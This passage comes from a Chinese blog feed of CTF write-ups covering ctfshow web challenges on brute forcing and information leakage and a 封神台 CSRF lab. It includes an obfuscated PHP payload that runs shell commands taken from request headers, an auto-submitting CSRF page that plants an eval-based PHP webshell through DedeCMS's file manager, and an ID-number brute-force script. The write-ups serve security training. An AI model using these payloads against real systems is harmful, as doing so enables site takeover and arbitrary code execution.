<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: GuYing</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021/8/15</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">$pi=<span class="string">"base_convert"</span>;</span><br><span class="line">$a=<span class="string">"system"</span>;</span><br><span class="line">$b=<span class="string">"getallheaders"</span>;</span><br><span class="line">$c=$pi($a,<span class="number">36</span>,<span class="number">10</span>);</span><br><span class="line">$d=$pi($b,<span class="number">30</span>,<span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> $pi($c,<span class="number">10</span>,<span class="number">36</span>).<span class="string">":"</span>.$c.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $pi($d,<span class="number">10</span>,<span class="number">30</span>).<span class="string">":"</span>.$d.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;通过更改headers中1对应的值来控制shell命令输出：&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $pi($c,<span class="number">10</span>,<span class="number">36</span>)($pi($d,<span class="number">10</span>,<span class="number">30</span>)()&#123;<span class="number">1</span>&#125;);</span><br><span class="line">$payload=<span class="string">"payload:&lt;br/&gt;"</span>.<span class="string">'$pi=base_convert;$pi'</span>.<span class="string">"($c,10,36)"</span>.<span class="string">'($pi'</span>.<span class="string">"($d,10,30)()&#123;1&#125;)"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>.$payload;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210815160232455.png" alt="image-20210815160232455"></p>
<p>直接将payload复制到靶场看看</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">$pi&#x3D;base_convert;$pi(1751504350,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210815160521953.png" alt="image-20210815160521953"></p>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>学习记录</tag>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】web篇-爆破 wp</title>
    <url>/posts/70.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>记录web的题目wp，慢慢变强，铸剑。</p>
</blockquote>
<h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><blockquote>
<p>tomcat认证爆破之burp custom iterator</p>
<ul>
<li><strong>第一种方式-burp使用之自定义迭代器</strong></li>
</ul>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/600eecb8b19793f8f443b4f41eda1b29.png" alt="image-20210602075713742"></p>
<blockquote>
<p>base64解密  就是 admin:admin形式，<strong>我输入的账号和密码就是admin和admin</strong></p>
<p>说明这是base64加密</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/53682bb5b322a960c84dbb25538ffa37.png" alt="image-20210602075845504"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/8f9d777faa9e44dee92737070636d375.png" alt="image-20210602080000069"></p>
<p><strong>position(1)</strong></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/17cf3e0095d4ac83a12439bba402ec9c.png" alt="image-20210602080029936"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/6cb45046c04b2427f0cef861b64182f9.png" alt="image-20210602080057955"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/64a2db62fc7659c3a9ed2e9722a29f97.png" alt="image-20210602080159630"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210602082330741.png" alt="image-20210602082330741"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210602082906219.png" alt="image-20210602082906219"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/a32cca75293441b030b9cf291a0a347d.png" alt="image-20210602080221754"></p>
<blockquote>
<ul>
<li>第二种方式-直接固定前缀<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210709091316243.png" alt="image-20210709091316243"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210709091404655.png" alt="image-20210709091404655"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210709091423940.png" alt="image-20210709091423940"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210709091444181.png" alt="image-20210709091444181"></li>
</ul>
</li>
</ul>
</blockquote>
<h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2><blockquote>
<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210709091949204.png" alt="image-20210709091949204"></li>
<li>说是爆破子域名用这个网站：<a href="https://phpinfo.me/domain" target="_blank" rel="noopener">https://phpinfo.me/domain</a></li>
<li>第二种是利用搜索引擎的语法进行搜索<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210709092027358.png" alt="image-20210709092027358"></li>
</ul>
</li>
</ul>
</blockquote>
<h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><blockquote>
<ul>
<li><p>源代码</p>
<ul>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210710175437343.png" alt="image-20210710175437343"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 11:43:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 11:56:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'token'</span>]))&#123;</span><br><span class="line">    $token = md5($_GET[<span class="string">'token'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(substr($token, <span class="number">1</span>,<span class="number">1</span>)===substr($token, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr($token, <span class="number">14</span>,<span class="number">1</span>) ===substr($token, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((intval(substr($token, <span class="number">1</span>,<span class="number">1</span>))+intval(substr($token, <span class="number">14</span>,<span class="number">1</span>))+substr($token, <span class="number">17</span>,<span class="number">1</span>))/substr($token, <span class="number">1</span>,<span class="number">1</span>)===intval(substr($token, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



</li>
</ul>
</li>
</ul>
<ul>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210710175548108.png" alt="image-20210710175548108"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210710175616862.png" alt="image-20210710175616862"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210710175638605.png" alt="image-20210710175638605"></p>
</li>
</ul>
</blockquote>
<h2 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h2><blockquote>
<ul>
<li><strong>mt_srand(seed) 根据seed的值会一直不变，不过不同的php版本会导致不同的结果</strong></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210711101447840.png" alt="image-20210711101447840"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210711101522334.png" alt="image-20210711101522334"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210711101557022.png" alt="image-20210711101557022"></li>
</ul>
</blockquote>
<h2 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h2><blockquote>
<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210712092257701.png" alt="image-20210712092257701"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210712092323692.png" alt="image-20210712092323692"></li>
<li><strong>使用网上找的程序php_mt_seed随机种子破解<a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">https://www.openwall.com/php_mt_seed/</a></strong></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210712092530617.png" alt="image-20210712092530617"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210712094851762.png" alt="image-20210712094851762"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210712094952070.png" alt="image-20210712094952070"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210712095025135.png" alt="image-20210712095025135"></li>
</ul>
</blockquote>
<h2 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h2><blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210715215131122.png" alt="image-20210715215131122"></p>
</blockquote>
<h2 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h2><blockquote>
<ul>
<li>得到了名单，明显缺少出生年月日<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210715215249427.png" alt="image-20210715215249427"></li>
</ul>
</li>
<li><strong>中间缺少8位数，利用1990年到2000年之间的出生日期构造第一名学生的身份证号payload</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($y=<span class="number">1990</span>; $y &lt; <span class="number">2000</span>; $y++) &#123; </span><br><span class="line">	<span class="keyword">for</span> ($m=<span class="number">1</span>; $m &lt; <span class="number">13</span>; $m++) &#123; </span><br><span class="line">		<span class="keyword">if</span> ($m &lt; <span class="number">10</span>) &#123;</span><br><span class="line">			$m = <span class="string">"0"</span>.$m;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> ($d=<span class="number">1</span>; $d &lt; <span class="number">32</span>; $d++) &#123; </span><br><span class="line">			<span class="keyword">if</span> ($d &lt; <span class="number">10</span>) &#123;</span><br><span class="line">				$d = <span class="string">"0"</span>.$d;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"621022"</span>.$y.$m.$d.<span class="string">"5237"</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210715220453961.png" alt="image-20210715220453961"></p>
<ul>
<li>burp跑一遍<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210715220728598.png" alt="image-20210715220728598"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210715220802214.png" alt="image-20210715220802214"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210715220834627.png" alt="image-20210715220834627"></li>
</ul>
</li>
</ul>
</blockquote>
<h2 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h2><blockquote>
<ul>
<li><strong>发现index会跳转0/1/2.txt</strong></li>
<li><strong>正常网站是index.php</strong></li>
<li><strong>报错0和1的深度试试</strong><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210715221957039.png" alt="image-20210715221957039"></li>
</ul>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>学习记录</tag>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】web篇-信息收集 wp</title>
    <url>/posts/69.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>记录web的题目wp，慢慢变强，铸剑。</p>
</blockquote>
<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><blockquote>
<p>右键查看源代码即可</p>
<p>ctrl+u</p>
</blockquote>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><blockquote>
<p>1、关掉javascript然后查看源码</p>
<p>2、ctrl+shift+i</p>
<p>3、view-source:</p>
<p>4、点击更过工具，开发者工具查看元素获得页面注释通过开发者工具查看网络response结果获得flag</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/f10dd25185cb296b3d40c25c8a55e470.png" alt="image-20210601202056830"></p>
<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><blockquote>
<p>开发者工具network抓包查看http协议头里面有个flag协议头，提交即可burpsuite抓包也可以</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/0760a2285985202b90199b57e9a50161.png" alt="image-20210601202158461"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/d97503fc40dff91069727180d198f67f.png" alt="image-20210601202315569"></p>
<blockquote>
<p>ctfshow{53968446-5c49-4e0a-a6af-3df14463c786}</p>
</blockquote>
<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><blockquote>
<p>直接上手君子协议</p>
<p>ctfshow{ca6071e4-33fd-4e4b-8f0e-c08bc2b1e7b1}</p>
</blockquote>
<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><blockquote>
<p>考虑了半天，提示phps源码泄露</p>
<p>还是得看tips</p>
<p>ctfshow{70bc7249-1347-4d63-9f62-b1c752661b03}</p>
</blockquote>
<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><blockquote>
<p>/<a href="http://www.zip，下载源码，然后网页上访问http://55a647d5-d0fc-40ec-93e4-edd2b997ed11.challenge.ctf.show:8080/fl000g.txt" target="_blank" rel="noopener">www.zip，下载源码，然后网页上访问http://55a647d5-d0fc-40ec-93e4-edd2b997ed11.challenge.ctf.show:8080/fl000g.txt</a></p>
<p>ctfshow{6a630fef-804b-4f6a-a892-e3e3f0f5fe6f}</p>
</blockquote>
<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><blockquote>
<p>考部署环境，时/.git/泄露代码</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/6fc7799bd8f1806b339ea8fbc43d01d1.png" alt="image-20210601203750323"></p>
<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><blockquote>
<p>是svn代码泄露，url/.svn/，后面这个/一定要加，不然就进不去</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/36cd8250a04519f82477cbc7b0cfadd7.png" alt="image-20210601205103745"></p>
<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><blockquote>
<p>linux中vim访问缓冲index.php.swp信息泄露</p>
<p>ctfshow{6100df72-a079-4f17-97b8-56886e12c786}</p>
</blockquote>
<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><blockquote>
<p>cookie中</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/94a5d82a2cc9ae8e91c06af428317502.png" alt="image-20210601205626532"></p>
<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><blockquote>
<p><a href="https://zijian.aliyun.com/" target="_blank" rel="noopener">https://zijian.aliyun.com/</a> 查域名</p>
<p><a href="http://dbcha.com/?t=1625617640" target="_blank" rel="noopener">http://dbcha.com/?t=1625617640</a> 查域名</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/d895049d59178cfb8b82e1e76da663c2.png" alt="image-20210601210418143"></p>
<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><blockquote>
<p>先看一波君子协议</p>
<p>然后admin和他手机是密码</p>
<p>robots.txt</p>
</blockquote>
<h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><blockquote>
<p>document下载</p>
<p>技术文档</p>
</blockquote>
<h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><blockquote>
<p>看题目，写editor编译器泄露，查看源码搜索找到editor</p>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210707083802791.png" alt="image-20210707083802791"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210707083825874.png" alt="image-20210707083825874"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210707083848916.png" alt="image-20210707083848916"></p>
<blockquote>
<p>通过路径找到flag</p>
<p><a href="http://c8ed7f63-f69c-4c94-9a34-5988bbdf9155.challenge.ctf.show:8080/nothinghere/fl000g.txt" target="_blank" rel="noopener">http://c8ed7f63-f69c-4c94-9a34-5988bbdf9155.challenge.ctf.show:8080/nothinghere/fl000g.txt</a></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210707083923575.png" alt="image-20210707083923575"></p>
</blockquote>
<h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><blockquote>
<p>通过邮箱查地址</p>
<p>改密码：西安</p>
</blockquote>
<h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><blockquote>
<p>进入tz.php这是默认</p>
<p>然后再点击phpinfo按钮里面有flag</p>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210707084326227.png" alt="image-20210707084326227"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210707084345975.png" alt="image-20210707084345975"></p>
<h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><blockquote>
<p>ping <a href="http://www.ctfshow.com" target="_blank" rel="noopener">www.ctfshow.com</a></p>
</blockquote>
<h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><blockquote>
<p><a href="http://d3be1272-066a-49ff-a6e8-b8def169e782.challenge.ctf.show:8080/110.php" target="_blank" rel="noopener">http://d3be1272-066a-49ff-a6e8-b8def169e782.challenge.ctf.show:8080/110.php</a></p>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210602184900428.png" alt="image-20210602184900428"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210707090523103.png" alt="image-20210707090523103"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210602184928433.png" alt="image-20210602184928433"></p>
<h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><blockquote>
<p>绕过前端JS直接提交hash使用hackbar的post：pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&amp;username=admin</p>
<p>post传参</p>
</blockquote>
<h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><blockquote>
<p>mdb文件asp+access数据库文件泄露</p>
<p>db/db.mdb，打开</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210707092002656.png" alt="image-20210707092002656"></p>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>学习记录</tag>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>【封神台】前端渗透 CSRF wp</title>
    <url>/posts/99.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>掌控安全里面的靶场前端渗透/CSRF，学习一下！</li>
</ul>
</blockquote>
<h1 id="CSRF跨站请求伪造了解"><a href="#CSRF跨站请求伪造了解" class="headerlink" title="CSRF跨站请求伪造了解"></a>CSRF跨站请求伪造了解</h1><p>csrf跨站请求伪造：也被称为“one click attack”或者sessingriding，通常缩写为csrf或者xsrf，是一种对网站的恶意利用。尽管听起来像跨站脚本(xss)但它与xss非常不同，xss利用的是站点内的信任用户，而csrf是通过伪装来自受信任的用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。</p>
<p>用户只要不关闭阅览器或者退出登录的时候，如果用户无意间点开了构造好的csrf脚本的链接，可能会用户不想做的事（通过恶意的js代码可以操纵阅览器去发送修改用户信息的数据包给正常的网站）<br>（因为用户访问正常网站时会产生cookie，，而用户没有关闭或者退出登陆，所以这个cookie还没有失效，所以就会很容易的进入正常网站去修改用户的信息）</p>
<h2 id="构造csrf恶意网站方法"><a href="#构造csrf恶意网站方法" class="headerlink" title="构造csrf恶意网站方法"></a>构造csrf恶意网站方法</h2><p>Burp有自己构造csrf poc 的功能，在让用户访问这个构造好的网页</p>
<h2 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h2><blockquote>
<p><strong>不用下源码，直接用这个测试csrf，poc的作用</strong></p>
<p>织梦管理登陆：<a href="http://59.63.200.79:8010/csrf/uploads/dede/login.php" target="_blank" rel="noopener">http://59.63.200.79:8010/csrf/uploads/dede/login.php</a></p>
<p>登陆方式：admin admin123</p>
</blockquote>
<blockquote>
<p><strong>这个织梦网站，是我们提交问题反馈，机器人访问从而getshell的网站</strong></p>
<p><a href="http://59.63.200.79:8010/newcsrf/" target="_blank" rel="noopener">http://59.63.200.79:8010/newcsrf/</a></p>
<p>问题反馈：<a href="http://59.63.200.79:8010/newcsrf/test/" target="_blank" rel="noopener">http://59.63.200.79:8010/newcsrf/test/</a></p>
<p>分析，提示是织梦cms，应该是发给管理员访问，然后直接写一句话，因为管理员页面无法访问。</p>
</blockquote>
<p><strong>由于找历史源码很麻烦，所以就不本地测试，直接用提供的第一个有账号密码的织梦靶场来测试是否存CSRF</strong></p>
<p>首先登陆之后，进入文件式管理器，写一句话木马抓包看看</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210818102059506.png" alt="image-20210818102059506"></p>
</blockquote>
<p>发现并没有token，或者验证码等限制，可以利用BURP的POC生成CSRF</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210818102229457.png" alt="image-20210818102229457"></p>
</blockquote>
<p>创建一个test.html来存储，来测试</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210818120547059.png" alt="image-20210818120547059"></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210818120627673.png" alt="image-20210818120627673"></p>
</blockquote>
<p><strong>打开刚刚新建的test.html，点击submit测试</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210818120706491.png" alt="image-20210818120706491"></p>
</blockquote>
<p>成功生成shell</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210818120740891.png" alt="image-20210818120740891"></p>
</blockquote>
<p><strong>但是这种需要我们自己点submit的方式一般没人会点，所以我们调成自动访问，加一个name:aa，然后document.aa.submit()直接提交实现自动提交，无需点击</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"aa"</span> <span class="attr">action</span>=<span class="string">"http://59.63.200.79:8010/csrf/uploads/dede/file_manage_control.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"fmdo"</span> <span class="attr">value</span>=<span class="string">"edit"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"backurl"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"activepath"</span> <span class="attr">value</span>=<span class="string">"<span class="symbol">&amp;#47;</span>csrf<span class="symbol">&amp;#47;</span>uploads<span class="symbol">&amp;#47;</span>uploads"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"filename"</span> <span class="attr">value</span>=<span class="string">"shell<span class="symbol">&amp;#46;</span>php"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"str"</span> <span class="attr">value</span>=<span class="string">"<span class="symbol">&amp;lt;</span><span class="symbol">&amp;#63;</span>php<span class="symbol">&amp;#32;</span>eval<span class="symbol">&amp;#40;</span><span class="symbol">&amp;#36;</span><span class="symbol">&amp;#95;</span>REQUEST<span class="symbol">&amp;#91;</span>1<span class="symbol">&amp;#93;</span><span class="symbol">&amp;#41;</span><span class="symbol">&amp;#59;</span><span class="symbol">&amp;#63;</span><span class="symbol">&amp;gt;</span>"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"B1"</span> <span class="attr">value</span>=<span class="string">"<span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#177;</span><span class="symbol">&amp;#163;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#180;</span>?<span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span>"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">		<span class="built_in">document</span>.aa.submit();</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>既然测试环境已经成功实现了csrf，我们可以尝试获取一下newcsrf靶场的实战，接着通过目录扫描获取了newcsrf的文件操作目录</strong><a href="http://59.63.200.79:8010/newcsrf/dede/file_manage_control.php，将poc中的action改成newcsrf的文件操作目录就可以提交了（注意：上传的一句话木马路径也要改对" target="_blank" rel="noopener">http://59.63.200.79:8010/newcsrf/dede/file_manage_control.php，将poc中的action改成newcsrf的文件操作目录就可以提交了（注意：上传的一句话木马路径也要改对</a> <code>name=&quot;activepath&quot; value=&quot;&amp;#47;newcsrf&quot;</code>）</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210818124106553.png" alt="image-20210818124106553"></p>
</blockquote>
